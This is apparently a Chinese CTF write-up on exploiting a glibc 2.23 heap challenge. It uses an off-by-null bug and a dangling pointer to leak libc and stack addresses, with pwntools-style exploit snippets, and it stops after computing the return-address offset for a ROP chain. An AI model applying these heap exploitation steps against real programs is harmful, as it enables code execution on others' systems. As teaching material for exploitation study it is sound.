![](../Images/155d7905137552418950bcbbc2544543.png)

是2.23的libc，放到ida里分析，可以看出是**add（）函数**。

![](../Images/9abdb6d46c5fa79c5dc97f7c9250f4aa.png)

只允许申请9个堆块，在用户申请堆块前，会先申请一个0x20大小的堆块，存放用户申请堆块的内容指针。还限制了我们最大只能申请0x100的堆块，show（）函数

![](../Images/8424087e2ff9ee64b1832f51e15f8d72.png)

这里是直接调用的，**如果没有沙箱，我们就可以通过show函数构造system sh去getshell edit（）函数**

![](../Images/34dfa48bde9c3fe7cbf42d5c77b3863b.png)

这里在调试时发现，edit函数存在offbynull漏洞，我们先申请两个堆块。

*   
*   

```
add(0xf8)add(0xf8)
```

之后edit 0号堆块

*   

```

```

![](../Images/4c3bd7b30301cdb756ea46d2d2ecca2c.png)

可以明显的看见1号堆块的prev inuse位已经被改掉了，**del（）函数**

![](../Images/3853d85a96228cebc509b7e2f27858d9.png)

这里只free掉了堆块，但是没有对fd bk指针进行置0，存在指针悬空，现在我们的思路就是**通过offbynull漏洞控制头堆块的指针，利用show函数leak出栈地址，之后我们算好栈中ret的偏移，写入rop去getshell**。我们先申请四个堆块：

*   
*   
*   
*   

```
add(0xf8)add(0xf8)add(0xf8)add(0xf8)
```

我们free掉0号，通过edit 1号堆块，伪造2号堆块的pre size位和pre inuse位，之后free掉2号堆块，触发堆块合并：

*   
*   
*   

```
free(0)edit(1,b'A'*0xf0 + p64(0x200))free(2)
```

![](../Images/99913568b998b13842c67aa4119a29b5.png)

我们重新申请出0x100的堆块，通切割unsortbin，leak出libc 基地址：

![](../Images/009e367ceaee0b930adc99c30908bd39.png)

```
add(0xf8)show(0)leak = u64(io.recv(6).ljust(8,'\x00'))libc_base = leak - 0x3c4e68system = libc_base + libc.sym['system']puts = libc_base+libc.sym['puts']environ = libc_base+libc.sym['environ']success('libc_base ==> ' + hex(libc_base))success('system ==> ' + hex(system))success('puts ==> ' + hex(puts))success('environ ==> ' + hex(environ))
```

![](../Images/816c36fa99d1237299372a50cf89c843.png)

之后我们思路是：

![](../Images/069698711cb112e03bb7ca2a86b0fd30.png)

我们将头堆块申请在我们可控的区域，就是1号堆块。我们想做到这一步，就需要**确保fastbin 中0x20的bins是空的**。否则，我们在申请0x100的堆块时，0x20的头堆块将从bins中申请出来，我们无法控制他的位置，所以我们接下来把bins清空。

![](../Images/fb78327a98010b4d5baea82abd933f74.png)

目前我们的bins中含有3个限制的0x20，我们申请出来：

*   
*   

```
add(0x10)add(-1)
```

我们申请0x10的堆块，可以消耗bins中2个0x20。申请-1大小的堆块，由于我们申请的大小不合法，所以我们申请不出-1大小的堆块，但是add中是先申请头堆块，再判断申请大小是否合法。

![](../Images/b5c7d4e88abc35c86c2440c546e6fbf8.png)

这样我们又消耗了bins中的一个0x20，此时我们的bins：

![](../Images/36d8319d0480b6c470bdab4457880c2e.png)

这里是空的，之后我们申请0xf8大小的堆块，就会从unsortbin中先分割出0x20大小的头堆块和0x100的堆块，正好构造成我们想要的。

![](../Images/3312059819a06b184f7ae362fc61dd7b.png)

我们通过edit1号堆块，去edit4号堆块的头的堆块，之后show，leak出栈地址：

*   
*   
*   
*   
*   

```
add(0xf8)edit(1,p64(puts)+p64(environ))show(4)stack = u64(io.recv(6).ljust(8,'\x00'))success(hex(stack))
```

![](../Images/ec7693c84ab72f55e30738ff7190e742.png)![](../Images/7f9136cc34892812f84a0041f8fc205f.png)

ret地址在bp指针+8的位置，所以我们算下leak出的栈地址与ret的偏移为0x100。

![](../Images/b233c14d511b1a998aefdac218cc514d.png)
